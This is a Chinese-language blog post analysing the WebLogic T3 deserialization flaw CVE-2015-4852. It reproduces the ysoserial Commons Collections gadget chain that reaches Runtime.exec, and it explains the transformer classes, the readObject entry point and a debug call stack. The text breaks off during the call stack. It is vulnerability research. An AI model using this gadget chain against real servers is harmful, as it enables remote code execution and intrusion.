<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Weblogic T3反序列化开篇：CVE-2015-4852漏洞描述即JAVA Apache-CommonsCollections 序列化RCE漏洞。 漏洞分析Weblogic: 10.3.6.0 JDK:1.6 参考1已经非常详细地介绍了这个漏洞的原理。其中涉及三个比较重要的部分：1) 入口反序列化点 2）利用链 3）T3协议 下面详细介绍一下。 入口反序列化点这个漏洞&#x2F;PoC选用的反序列化入">
<meta property="og:type" content="article">
<meta property="og:title" content="weblogic&#x2F;Weblogic T3反序列化开篇： CVE-2015-4852">
<meta property="og:url" content="http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/index.html">
<meta property="og:site_name" content="Homer&#39;s blog">
<meta property="og:description" content="Weblogic T3反序列化开篇：CVE-2015-4852漏洞描述即JAVA Apache-CommonsCollections 序列化RCE漏洞。 漏洞分析Weblogic: 10.3.6.0 JDK:1.6 参考1已经非常详细地介绍了这个漏洞的原理。其中涉及三个比较重要的部分：1) 入口反序列化点 2）利用链 3）T3协议 下面详细介绍一下。 入口反序列化点这个漏洞&#x2F;PoC选用的反序列化入">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-04-10T15:28:24.534Z">
<meta property="article:modified_time" content="2020-04-10T15:28:24.534Z">
<meta property="article:author" content="Homer">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>weblogic/Weblogic T3反序列化开篇： CVE-2015-4852</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/04/10/weblogic/XMLDecoder%20RCE%E8%B5%B7%E6%BA%90%EF%BC%9ACVE-2017-3506/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/04/10/hello-world/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/" target="_blank" rel="noopener"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&text=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&is_video=false&description=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852&body=Check out this article: http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&title=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852" target="_blank" rel="noopener"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E7%AF%87%EF%BC%9A%20CVE-2015-4852/&name=weblogic/Weblogic T3反序列化开篇： CVE-2015-4852&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic-T3反序列化开篇：CVE-2015-4852"><span class="toc-number">1.</span> <span class="toc-text">Weblogic T3反序列化开篇：CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#入口反序列化点"><span class="toc-number">1.2.1.</span> <span class="toc-text">入口反序列化点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用链"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞调试"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC"><span class="toc-number">1.4.</span> <span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补丁"><span class="toc-number">1.5.</span> <span class="toc-text">补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过"><span class="toc-number">1.6.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        weblogic/Weblogic T3反序列化开篇： CVE-2015-4852
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Homer's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-04-10T15:28:24.534Z" itemprop="datePublished">2020-04-10</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Weblogic-T3反序列化开篇：CVE-2015-4852"><a href="#Weblogic-T3反序列化开篇：CVE-2015-4852" class="headerlink" title="Weblogic T3反序列化开篇：CVE-2015-4852"></a>Weblogic T3反序列化开篇：CVE-2015-4852</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>即<code>JAVA Apache-CommonsCollections 序列化RCE漏洞</code>。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Weblogic: 10.3.6.0</p>
<p>JDK:1.6</p>
<p><code>参考1</code>已经非常详细地介绍了这个漏洞的原理。其中涉及三个比较重要的部分：1) 入口反序列化点 2）利用链 3）T3协议 下面详细介绍一下。</p>
<h3 id="入口反序列化点"><a href="#入口反序列化点" class="headerlink" title="入口反序列化点"></a>入口反序列化点</h3><p>这个漏洞/PoC选用的反序列化入口点是<code>AnnotationInvocationHandler::readObject</code>，一来可以被外界访问；二来这个入口点跟利用链是紧密相关的。</p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>注意本小节是直接将<code>参考1</code>中原文部分<strong>拷贝</strong>过来，稍微排版一下。</p>
<p>利用链的核心代码来自<code>参考3</code>，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span>	</span><br><span class="line"> <span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">			<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">				new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">					<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">					<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">					<span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">execArgs</span>),</span></span><br><span class="line"><span class="class">				<span class="title">new</span> <span class="title">ConstantTransformer</span>(1) &#125;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> handler;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>​    信息 1</p>
<p>我们先来看一下 Transformer 接口，该接口仅定义了一个方法 transform(Object input)：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 2</p>
<p>我们可以看到该方法的作用是：给定一个 Object 对象经过转换后也返回一个 Object，该 PoC 中利用的是三个实现类：<code>ChainedTransformer</code>，<code>ConstantTransformer</code>，<code>InvokerTransformer</code></p>
<p>首先看 InvokerTransformer 类中的 transform() 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>信息 3</p>
<p>可以看到该方法中采用了反射的方法进行函数调用，Input 参数为要进行反射的对象 iMethodName , iParamTypes 为调用的方法名称以及该方法的参数类型，iArgs 为对应方法的参数，这三个参数均为可控参数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 4</p>
<p>接下来我们看一下 ConstantTransformer 类的 transform() 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 5</p>
<p>该方法很简单，就是返回 iConstant 属性，该属性也为可控参数。</p>
<p>最后一个ChainedTransformer类很关键，我们先看一下它的构造函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 6</p>
<p>我们可以看出它传入的是一个 Transformer 数组，接下来看一下它的 transform() 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信息 7</p>
<p>这里使用了 for 循环来调用 Transformer 数组的 transform() 方法，并且使用了 object 作为后一个调用transform() 方法的参数。</p>
<p>现在再回顾一下ysoserial中的利用链代码，形成了一个完美的调用链，利用Java的反射机制执行了命令。</p>
<p>至于链本身的逻辑，见<code>参考 6</code>，这里提取关键信息作参考：</p>
<blockquote>
<ol>
<li>构造一个<code>ConstantTransformer</code>，把<code>Runtime</code>的<code>Class</code>对象传进去，在<code>transform()</code>时，始终会返回这个对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>getMethod</code>，参数为<code>getRuntime</code>，在<code>transform()</code>时，传入1的结果，此时的<code>input</code>应该是<code>java.lang.Runtime</code>，但经过<code>getClass()</code>之后，<code>cls</code>为<code>java.lang.Class</code>，之后<code>getMethod()</code>只能获取<code>java.lang.Class</code>的方法，因此才会定义的待调用方法名为<code>getMethod</code>，然后其参数才是<code>getRuntime</code>，它得到的是<code>getMethod</code>这个方法的<code>Method</code>对象，<code>invoke()</code>调用这个方法，最终得到的才是<code>getRuntime</code>这个方法的<code>Method</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>invoke</code>，参数为空，在<code>transform()</code>时，传入2的结果，同理，<code>cls</code>将会是<code>java.lang.reflect.Method</code>，再获取并调用它的<code>invoke</code>方法，实际上是调用上面的<code>getRuntime()</code>拿到<code>Runtime</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>exec</code>，参数为命令字符串，在<code>transform()</code>时，传入3的结果，获取<code>java.lang.Runtime</code>的<code>exec</code>方法并传参调用</li>
<li>最后把它们组装成一个数组全部放进<code>ChainedTransformer</code>中，在<code>transform()</code>时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求</li>
</ol>
</blockquote>
<p>但此时，我们还没法利用，得在weblogic中找个点能触发ChainedTransformer的transform方法。ysoserial给出的点是<code>AnnotationInvocationHandler::readObject</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); ---<span class="number">8.1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>信息 8</p>
<p>在8.1处，会形成调用链，到transform。可以参考<code>信息 1</code>处的注释信息，也可以参考下一小节中的调试信息。</p>
<p>###T3协议</p>
<p>见<code>参考2</code>。</p>
<p>需要关注的是下一小节的调用栈，可以看到T3协议进来，Weblogic的处理流程。</p>
<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><p>在 <code>ChainedTransformer::transform</code>设定一个断点，看看调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">157</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">51</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy57 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">328</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">39</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">25</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">597</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">969</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1871</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1775</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1327</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">349</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev 